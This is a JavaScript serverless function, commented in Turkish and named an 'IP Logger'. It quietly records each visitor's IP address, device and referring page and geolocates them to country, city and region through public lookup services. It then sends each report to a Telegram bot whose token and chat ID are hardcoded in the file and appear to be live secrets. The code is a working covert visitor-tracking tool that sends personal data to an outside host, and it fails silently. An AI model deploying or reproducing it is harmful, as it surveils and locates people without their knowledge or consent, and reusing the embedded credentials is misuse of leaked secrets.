// api/log-ip.js
// Federasyonlar IP Logger - Optimized for Real City + Country

export default async function handler(req, res) {
  try {
    // Get IP Address (Best method for Vercel)
    let ip = req.headers['x-forwarded-for']
      ? req.headers['x-forwarded-for'].split(',')[0].trim()
      : req.headers['x-real-ip']
      || req.socket?.remoteAddress
      || 'Bilinmiyor';

    // Remove IPv6 prefix if present
    if (ip.startsWith('::ffff:')) {
      ip = ip.replace('::ffff:', '');
    }

    const userAgent = req.headers['user-agent'] || 'Bilinmiyor';
    const pageURL = req.headers.referer || req.headers.origin || 'Doğrudan Erişim';
    const timestamp = new Date().toLocaleString('tr-TR');

    // Get accurate location data
    let country = "Bilinmiyor";
    let city = "Bilinmiyor";
    let region = "Bilinmiyor";

    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
        headers: { 'User-Agent': 'Federasyonlar-IP-Logger' }
      });

      if (geoRes.ok) {
        const geo = await geoRes.json();
        country = geo.country_name || geo.country || "Bilinmiyor";
        city = geo.city || "Bilinmiyor";
        region = geo.region || geo.region_code || "Bilinmiyor";
      }
    } catch (e) {
      // Fallback: Try another free service
      try {
        const fallbackRes = await fetch(`https://freegeoip.app/json/${ip}`);
        if (fallbackRes.ok) {
          const geo = await fallbackRes.json();
          country = geo.country_name || "Bilinmiyor";
          city = geo.city || "Bilinmiyor";
          region = geo.region_name || "Bilinmiyor";
        }
      } catch { }
    }

    const message = `
🛡️ Yeni Ziyaretçi

🌐 IP Adresi: ${ip}
🇹🇷 Ülke: ${country}
🏙️ Şehir: ${city}
📍 Bölge: ${region}
🔗 Sayfa: ${pageURL}
📱 Cihaz: ${userAgent.substring(0, 100)}... 
⏰ Zaman: ${timestamp}
    `.trim();

    const BOT_TOKEN = "8797755900:AAFZYIce4vrR5YMQAB0Khz4oaQng2iDfe8M";   // ← Buraya yaz
    const CHAT_ID = "8437897670";     // ← Buraya yaz

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    return res.status(200).json({ success: true });

  } catch (error) {
    // Silent fail
    return res.status(200).json({ success: false });
  }
}